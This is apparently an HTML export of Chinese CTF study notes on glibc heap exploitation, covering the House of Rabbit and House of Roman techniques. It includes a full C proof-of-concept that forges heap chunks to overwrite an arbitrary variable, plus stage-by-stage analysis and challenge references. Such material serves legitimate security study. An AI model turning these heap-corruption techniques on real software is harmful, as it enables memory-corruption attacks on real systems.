@@ -1,0 +1,589 @@
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="text/css" http-equiv="Content-Style-Type">
+<title>CTF PWN14</title>
+</head>
+<body>
+<h1 align="center" class="root">
+<a name="1roqpdv36bt5e2liupe9e45okq">CTF PWN14</a>
+</h1>
+<div align="center" class="globalOverview">
+<img src="CTF PWN14_files/images/CTF PWN14.jpg"></div>
+<h2 class="topic">
+<a name="0087pqjdv0r9v0po1vv6cntu8v">堆溢出</a>
+</h2>
+<h3 class="topic">
+<a name="6tiutgfib436m1ajjmuujvjmqi">&nbsp;House of Rabbit</a>
+</h3>
+<h3 class="topic">
+<a name="4dirohk0gcupd124g5330lgsmb">&nbsp;&nbsp;介绍</a>
+</h3>
+<h3 class="topic">
+<a name="4kfv4oqo0toegd6mlcl6bv2p6l">&nbsp;&nbsp;&nbsp;简单来说就是通过修改fastbin的fd指针或size字段，当程序执行malloc consolidate时(merge top或malloc big chunk时会调用该函数)，会对fastbin中的空闲堆块进行合并，这一过程中没有检测size，所以可以通过这一个过程将伪造的chunk链入bin中，从而方便下一次malloc时在指定位置申请chunk</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/7vre5gjp9l1c9r4nqjot3pujva.png"></p>
+<h3 class="topic">
+<a name="6k3l5uoflc8ckkkrsf8ue3u89v">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/6ribjsueocrpqrr0jisv2ddvlb.png"></p>
+<h3 class="topic">
+<a name="0eue3m29hn1hfqok4snvord5uj">&nbsp;&nbsp;原理</a>
+</h3>
+<h3 class="topic">
+<a name="299nffom5pt8h2g4ohvdqrahuq">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/74pvi892vqbqgbu3bnssl8ivka.png"></p>
+<h3 class="topic">
+<a name="203qj77kb815vn6kpt1a7l6htl">&nbsp;&nbsp;&nbsp;&nbsp;原理很简单，就是通过修改fastbin chunk的size(如上面的POC 1所示)直接构造overlap chunk，或者修改fd(如面的POC 2所示)，让它指向一个fake chunk，触发malloc consolidate之后让这个fake chunk成为一个合法的chunk。</a>
+</h3>
+<h3 class="topic">
+<a name="5lgc4etskuvt6fjrlee6et1i9u">&nbsp;&nbsp;&nbsp;modify the size of fastbin chunk </a>
+</h3>
+<h3 class="topic">
+<a name="1ovrecmhp6uh0kc9abs2jkt83c">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/2joh80rcnrgfafttft84ebe8q2.png"></p>
+<h3 class="topic">
+<a name="36fe1m3p75lu6fmi5nra56oijo">&nbsp;&nbsp;&nbsp;modify FD pointer</a>
+</h3>
+<h3 class="topic">
+<a name="6qoke2mmorukjr1p7dp656uqj0">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/2e6acam23atfume3mug8irgur0.png"></p>
+<h3 class="topic">
+<a name="5s7kg4ihetflro322usi6572m1">&nbsp;&nbsp;示例</a>
+</h3>
+<h3 class="topic">
+<a name="67scp2n310n2g630malgi91dfv">&nbsp;&nbsp;&nbsp;示例来源于：https://github.com/shift-crops/House_of_Rabbit</a>
+</h3>
+<h3 class="topic">
+<a name="30mk5jdffd0g1gb800ghfoifq5">&nbsp;&nbsp;&nbsp;&nbsp;/*&#13;
+&#13;
+   PoC of House of Rabbit&#13;
+&#13;
+   Tested in Ubuntu 14.04, 16.04 (64bit).&#13;
+&#13;
+   &#13;
+&#13;
+   Yutaro Shimizu&#13;
+&#13;
+   @shift_crops&#13;
+&#13;
+   2017/09/14&#13;
+&#13;
+&#13;
+&#13;
+   Update (2019/08/06) : Ubuntu 18.04 (glibc-2.27)&#13;
+&#13;
+*/&#13;
+&#13;
+&#13;
+&#13;
+// gcc house_of_rabbit.c -D GLIBC_VERSION=27 -o house_of_rabbit&#13;
+&#13;
+&#13;
+&#13;
+#include &lt;stdio.h&gt;&#13;
+&#13;
+#include &lt;stdlib.h&gt;&#13;
+&#13;
+#include &lt;string.h&gt;&#13;
+&#13;
+&#13;
+&#13;
+void evict_tcache(size_t size);&#13;
+&#13;
+&#13;
+&#13;
+char target[0x30] = "Hello, World!";&#13;
+&#13;
+unsigned long gbuf[8] = {0};&#13;
+&#13;
+&#13;
+&#13;
+int main(void){&#13;
+&#13;
+	void *p, *fast, *small, *fake;&#13;
+&#13;
+	char *victim;&#13;
+&#13;
+&#13;
+&#13;
+	setbuf(stdin, NULL);&#13;
+&#13;
+	setbuf(stdout, NULL);&#13;
+&#13;
+&#13;
+&#13;
+	printf(	"This is PoC of House of Rabbit\n"&#13;
+&#13;
+		"This technique bypassing Heap ASLR without leaking address, "&#13;
+&#13;
+		"and make it possible to overwrite a variable located at an arbitary address.\n"&#13;
+&#13;
+		"Jump like a rabbit and get an accurate address by malloc! :)\n\n");&#13;
+&#13;
+&#13;
+&#13;
+	// 0. Disable tcache for 0x20,0x90 chunks&#13;
+&#13;
+	printf("0. Disable tcache for 0x20,0x90 chunks (for glibc version &gt;= 2.26)\n\n");&#13;
+&#13;
+	evict_tcache(0x18);&#13;
+&#13;
+	evict_tcache(0x88);&#13;
+&#13;
+&#13;
+&#13;
+&#13;
+&#13;
+	// 1. Make 'av-&gt;system_mem &gt; 0xa00000'&#13;
+&#13;
+	printf("1. Make 'av-&gt;system_mem &gt; 0xa00000'\n");&#13;
+&#13;
+	p = malloc(0xa00000);&#13;
+&#13;
+	printf("  Allocate 0xa00000 byte by mmap at %p, and free.\n", p);&#13;
+&#13;
+	free(p);&#13;
+&#13;
+&#13;
+&#13;
+	p = malloc(0xa00000);&#13;
+&#13;
+	printf("  Allocate 0xa00000 byte in heap at %p, and free.\n", p);&#13;
+&#13;
+	free(p);&#13;
+&#13;
+	printf("  Then, the value of 'av-&gt;system_mem' became larger than 0xa00000.\n\n");&#13;
+&#13;
+&#13;
+&#13;
+&#13;
+&#13;
+	// 2. Free fast chunk and link to fastbins&#13;
+&#13;
+	printf("2. Free fast chunk and link to fastbins\n");&#13;
+&#13;
+	fast = malloc(0x18);&#13;
+&#13;
+	small = malloc(0x88);&#13;
+&#13;
+	printf(	"  Allocate fast chunk and small chunk.\n"&#13;
+&#13;
+		"  fast = %p\n"&#13;
+&#13;
+		"  small = %p\n", fast, small);&#13;
+&#13;
+	free(fast);&#13;
+&#13;
+	printf("  Free fast chunk.\n\n");&#13;
+&#13;
+&#13;
+&#13;
+	&#13;
+&#13;
+	// 3. Make fake_chunk on .bss&#13;
+&#13;
+	printf("3. Make fake_chunk on .bss\n");&#13;
+&#13;
+	gbuf[0] = 0xfffffffffffffff0;&#13;
+&#13;
+	gbuf[1] = 0x10;&#13;
+&#13;
+	gbuf[3] = 0x21;&#13;
+&#13;
+	gbuf[7] = 0x1;&#13;
+&#13;
+	printf(	"  fake_chunk1 (size : 0x%lx) is at %p\n"&#13;
+&#13;
+		"  fake_chunk2 (size : 0x%lx) is at %p\n\n"&#13;
+&#13;
+		, gbuf[3], &amp;gbuf[2], gbuf[1], &amp;gbuf[0]);&#13;
+&#13;
+&#13;
+&#13;
+&#13;
+&#13;
+	// VULNERABILITY&#13;
+&#13;
+	// use after free or fastbins dup etc...&#13;
+&#13;
+	fake = &amp;gbuf[2];&#13;
+&#13;
+	printf(	"VULNERABILITY (e.g. UAF)\n"&#13;
+&#13;
+		"  *fast = %p\n"&#13;
+&#13;
+		, fake);&#13;
+&#13;
+	*(unsigned long**)fast = fake;&#13;
+&#13;
+	printf("  fastbins list : [%p, %p, %p]\n\n", fast-0x10, fake, *(void **)(fake+0x10));&#13;
+&#13;
+&#13;
+&#13;
+&#13;
+&#13;
+	// 4. call malloc_consolidate&#13;
+&#13;
+	printf(	"4. call malloc_consolidate\n"&#13;
+&#13;
+		"  Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n"&#13;
+&#13;
+		, small, fake);&#13;
+&#13;
+	free(small);&#13;
+&#13;
+&#13;
+&#13;
+&#13;
+&#13;
+	// 5. Link unsorted bins to appropriate list&#13;
+&#13;
+	printf(	"5. Link unsorted bins to appropriate list\n"&#13;
+&#13;
+		"  Rewrite fake_chunk1's size to 0xa0001 to bypass 'size &lt; av-&gt;system_mem' check.\n");&#13;
+&#13;
+	gbuf[3] = 0xa00001;&#13;
+&#13;
+	malloc(0xa00000);&#13;
+&#13;
+	printf(	"  Allocate huge chunk.\n"&#13;
+&#13;
+		"  Now, fake_chunk1 link to largebin[126](max).\n"&#13;
+&#13;
+		"  Then, write fake_chunk1's size back to 0xfffffffffffffff1.\n\n");&#13;
+&#13;
+	gbuf[3] = 0xfffffffffffffff1;	&#13;
+&#13;
+&#13;
+&#13;
+&#13;
+&#13;
+	// 6. Overwrite targer variable&#13;
+&#13;
+	printf(	"6. Overwrite targer variable on .data\n"&#13;
+&#13;
+		"  target is at %p\n"&#13;
+&#13;
+		"  Before : %s\n"&#13;
+&#13;
+		, &amp;target, target);&#13;
+&#13;
+&#13;
+&#13;
+	malloc((void*)&amp;target-(void*)(gbuf+2)-0x20);&#13;
+&#13;
+	victim = malloc(0x10);&#13;
+&#13;
+	printf("  Allocate 0x10 byte at %p, and overwrite.\n", victim);&#13;
+&#13;
+	strcpy(victim, "Hacked!!");&#13;
+&#13;
+&#13;
+&#13;
+	printf("  After  : %s\n", target);&#13;
+&#13;
+}&#13;
+&#13;
+&#13;
+&#13;
+void evict_tcache(size_t size){&#13;
+&#13;
+	void *p;&#13;
+&#13;
+&#13;
+&#13;
+#if defined(GLIBC_VERSION) &amp;&amp; (GLIBC_VERSION &gt;= 26)&#13;
+&#13;
+	p = malloc(size);&#13;
+&#13;
+&#13;
+&#13;
+#if	(GLIBC_VERSION &lt; 29)&#13;
+&#13;
+	free(p);&#13;
+&#13;
+	free(p);&#13;
+&#13;
+	malloc(size);&#13;
+&#13;
+	malloc(size);&#13;
+&#13;
+&#13;
+&#13;
+	*(void**)p = NULL;&#13;
+&#13;
+&#13;
+&#13;
+	malloc(size);&#13;
+&#13;
+#else&#13;
+&#13;
+&#13;
+&#13;
+#if (GLIBC_VERSION == 29)&#13;
+&#13;
+	char *counts 		= (char*)(((unsigned long)p &amp; ~0xfff) + 0x10);&#13;
+&#13;
+#else&#13;
+&#13;
+	uint16_t *counts 	= (char*)(((unsigned long)p &amp; ~0xfff) + 0x10);&#13;
+&#13;
+#endif&#13;
+&#13;
+	counts[(size + 0x10 &gt;&gt; 4) - 2] = 0xff;&#13;
+&#13;
+&#13;
+&#13;
+#endif&#13;
+&#13;
+#endif&#13;
+&#13;
+}</a>
+</h3>
+<h3 class="topic">
+<a name="76486dgij4879s23smujrjsic1">&nbsp;&nbsp;&nbsp;解析来源于：http://p4nda.top/2018/04/18/house-of-rabbit/</a>
+</h3>
+<h3 class="topic">
+<a name="1nurqc1fh4dqlcuji8ku9o5a7v">&nbsp;&nbsp;&nbsp;&nbsp;第一阶段：增大malloc函数中的mmap分配阈值</a>
+</h3>
+<h3 class="topic">
+<a name="3hov9mtq3a0lac1r4tjsg6a8t8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;malloc函数分配内存较大超过mmap阈值，则会使用mmap的方法分配内存，同时mmap阈值也会被改变，从而下一次分配相同大小的内存时，不超过mmap阈值，就不会使用mmap方式分配内存，仅使用brk方式分配内存</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/3h37jf6dgd4ojfrukppnt7ho20.png"></p>
+<h3 class="topic">
+<a name="2ub04v272hcsjbncc4sshcggvt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最终toopchunk的大小得到扩大</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/0uab74seql6funm8a0clpsruib.png"></p>
+<h3 class="topic">
+<a name="3ln34juhl6uuui0dvkhq5p34rm">&nbsp;&nbsp;&nbsp;&nbsp;第二阶段：申请小堆块并放入fastbin</a>
+</h3>
+<h3 class="topic">
+<a name="5h7iukp3k68aso8s084sa7ph8j">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从topchunk中切割出两个fastbinchunk和smallbinchunk，并将fastbinchunk释放</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/4t1n0vucds5pnic14nr6d05oi5.png"></p>
+<h3 class="topic">
+<a name="09lnm2mgjppkla9bcpu742q3ns">&nbsp;&nbsp;&nbsp;&nbsp;第三阶段：伪造堆块并将其链入fastbin</a>
+</h3>
+<h3 class="topic">
+<a name="5v5mfqta6d2qihmaurcgnjb18f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/4sue6khkqdmj77dl557eg761gt.png"></p>
+<h3 class="topic">
+<a name="242htem9mcq45p3v6jtauhkr77">&nbsp;&nbsp;&nbsp;&nbsp;第四阶段：利用malloc_consolidate使伪造堆块进入Unsorted bin中</a>
+</h3>
+<h3 class="topic">
+<a name="1mr9c2k3vf18uaged09202esre">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/2kkl4oq4n1ecri6r0u8fihgsuj.png"></p>
+<h3 class="topic">
+<a name="1bgl49gf4e121d70240mct3tmp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/346kqr7cd2iop65273i51e6rjj.png"></p>
+<h3 class="topic">
+<a name="7j6b48klvfgvo3mbndenn1rqrh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/4lpvftr1upqtg3b46hiq76dbkp.png"></p>
+<h3 class="topic">
+<a name="3904du8lopve4ufc89p578uv91">&nbsp;&nbsp;&nbsp;&nbsp;第五阶段：通过申请内存，将伪造堆块链入Large bin</a>
+</h3>
+<h3 class="topic">
+<a name="1oeglp4f9rukhpah3fgtmkcjdo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/0kmjdj5otsh5qaq0bo50rl74vj.png"></p>
+<h3 class="topic">
+<a name="5te2go278jj9h2u4glv50omect">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/2o9aa9ss0ccf1ktpidtjtccpro.png"></p>
+<h3 class="topic">
+<a name="65frl388s522tmc7vjpa1f2mj7">&nbsp;&nbsp;&nbsp;&nbsp;阶段6 任意内存分配</a>
+</h3>
+<h3 class="topic">
+<a name="534o3f7shfue5ckd1o0n78lla5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/4mj1u2jbmvfblhd3po3d23epl4.png"></p>
+<h3 class="topic">
+<a name="34lk66n38aqcms7q5786fuetc6">&nbsp;&nbsp;总结</a>
+</h3>
+<h3 class="topic">
+<a name="4u0o3i8pf3m97j0eglkntbid1p">&nbsp;&nbsp;&nbsp;House of rabbit的优点是容易构造overlap chunk，由于可以基于fastbin attack，甚至不需要leak就可以完成攻击。大家可以通过例题的练习加深对这个攻击的理解。</a>
+</h3>
+<h3 class="topic">
+<a name="17scg9ji4sokeqnfb4lg8huk3c">&nbsp;&nbsp;例题</a>
+</h3>
+<h3 class="topic">
+<a name="4p2ajb295djm7e29mr4cgept13">&nbsp;&nbsp;&nbsp;HITB-GSEC-XCTF 2018 mutepig</a>
+</h3>
+<h3 class="topic">
+<a name="0gep0l56ukcl9fppggfp0332op">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/7d62h1csus82tdm1qeit90g5hm.png"></p>
+<h3 class="topic">
+<a name="0ifiemo2ura8e6b4hir27pru3o">&nbsp;&nbsp;&nbsp;&nbsp;exp</a>
+</h3>
+<h3 class="topic">
+<a name="4fo6mr3acnb0k3c9puvbtrd85o">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/61hqc2p9p690slig32g3t88la5.png"></p>
+<h3 class="topic">
+<a name="6rlbl01gcun8es5cqjfsiukl1g">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/1dsiu85rm98u2qhudbru4uti0c.png"></p>
+<h3 class="topic">
+<a name="2qhl9hko25tbops27mi2env6en">&nbsp;&nbsp;参考资料</a>
+</h3>
+<h3 class="topic">
+<a name="4mabhbv5mim28qbvk0ppu169uq">&nbsp;&nbsp;&nbsp;http://p4nda.top/2018/04/18/house-of-rabbit/</a>
+</h3>
+<h3 class="topic">
+<a name="5997e7flifrq2ilp2uvllfatbh">&nbsp;House of roman</a>
+</h3>
+<h3 class="topic">
+<a name="4i55njov8002dgvuvod4655upr">&nbsp;&nbsp;介绍</a>
+</h3>
+<h3 class="topic">
+<a name="06rd12docg9b4ps9hnlhdvu65v">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/3h7kf3b66ovppd43orfss3gk16.png"></p>
+<h3 class="topic">
+<a name="7kidr6s9lmdifdc58ui667gu40">&nbsp;&nbsp;原理及展示</a>
+</h3>
+<h3 class="topic">
+<a name="0oeek8igf821mb7s17oca6s61o">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/52cju2nnbqv3odis1b5nnb1ldl.png"></p>
+<h3 class="topic">
+<a name="5r4tppt5jgllntjg4r2itmedbr">&nbsp;&nbsp;&nbsp;demo示例</a>
+</h3>
+<h3 class="topic">
+<a name="263l333pa5s0n8375fvj4l0kuc">&nbsp;&nbsp;&nbsp;&nbsp;demo情况</a>
+</h3>
+<h3 class="topic">
+<a name="4nu6imo6eaoobvut90uoj17sjb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/5g6b39hu9rt0r2fcjfpfaq76ov.png"></p>
+<h3 class="topic">
+<a name="2n9mj3f7eu7fhco9e8vrcfeaiu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Malloc ， 用户输入 size, 然后 malloc(size) , 大小不限&#13;
+Write, 往指定 heap_ptr 写入 size+1 字节数据，一字节溢出&#13;
+Free, 调用 free 释放掉 heap_ptr ，不过没有清零，double free 和 uaf （Write 时只是校验 指针是否为 0）.</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/4l7hdhk6m01vnqdd5icgji16lo.png"></p>
+<h3 class="topic">
+<a name="6f43drc185sj0oi47uvva6kpod">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/0nmg1amdf8m09tjdo6klof5i77.png"></p>
+<h3 class="topic">
+<a name="5v5u6o1iri4objppur62mjuvol">&nbsp;&nbsp;&nbsp;&nbsp;漏洞利用思路</a>
+</h3>
+<h3 class="topic">
+<a name="1fesmf0thgs49p4sil3t2e3ve7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/7ojds3dsr3fvdi3efpacc1tavf.png"></p>
+<h3 class="topic">
+<a name="181t5pjkrv6r8h8aeitediapi8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总体利用思路</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/6v2e5q10778302c1i0hlo655e7.png"></p>
+<h3 class="topic">
+<a name="128ur3f09sf3e9kpuafl9d7t5b">&nbsp;&nbsp;&nbsp;&nbsp;exp分析</a>
+</h3>
+<h3 class="topic">
+<a name="1siafo26n431i3s4e0jsj43f5r">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/6gbr9h6uiqgf5l9bkn2qjes480.png"></p>
+<h3 class="topic">
+<a name="0chb8kdikjpbvb2um0o4hsoutk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/17emb4dth49p240cohse1hfntr.png"></p>
+<h3 class="topic">
+<a name="2o8r0ikcs3aqkp75918ni38nm0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/0kffsh8u6k4u8gas8id0ut0jl1.png"></p>
+<h3 class="topic">
+<a name="6p64cbu52j1rpeioqqh6ldurim">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/45n6s2hbsgsl18ectugqr1gddo.png"></p>
+<h3 class="topic">
+<a name="3t47b69o76k0sbhvkht2hsi0si">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/3gua0gkqf85hnpbghgo0nktn0t.png"></p>
+<h3 class="topic">
+<a name="1q2u0jcp853atltt0m9acjhn9q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/2gsvadcon5e1gfiir6g0od6d8o.png"></p>
+<h3 class="topic">
+<a name="1ied8bilnagufri1tq9epqim51">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/1jp6ssvrlj361ti1scn936h3p0.png"></p>
+<h3 class="topic">
+<a name="6527bpeb6kaumk2m5fg07m7o84">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/5vodb1ak9n1r866lcqto5vhq16.png"></p>
+<h3 class="topic">
+<a name="57rsa4883dg9ru5vo9n8modhuc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/5cek1qulaa2u6fj3mgikuhk75g.png"></p>
+<h3 class="topic">
+<a name="2u21gilcvv7eqnqrfdfpo9h4jq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/2anva3bhtbtnfb7f0tvguh9jo5.png"></p>
+<h3 class="topic">
+<a name="5et7l0ufu4s7s6sm3gvdkfpbe8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结</a>
+</h3>
+<h3 class="topic">
+<a name="3kek820skt311a3o81dg5btln3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN14_files/4i877rg0o8j6cufje5s5lrd9to.png"></p>
+<h3 class="topic">
+<a name="6c4rcreftnt79r6uad6f43m6tl">&nbsp;&nbsp;参考资料</a>
+</h3>
+<h3 class="topic">
+<a name="61l60qlqjvhi0o9hq4v2u6n0np">&nbsp;&nbsp;&nbsp;https://xz.aliyun.com/t/2316</a>
+</h3>
+<h3 class="topic">
+<a name="1di4f14p41unf9ccgb07p6gvib">&nbsp;&nbsp;&nbsp;https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc</a>
+</h3>
+<h3 class="topic">
+<a name="5ttq8o1691l6db8118kqhv2j2n">&nbsp;&nbsp;&nbsp;https://github.com/romanking98/House-Of-Roman</a>
+</h3>
+</body>
+</html>
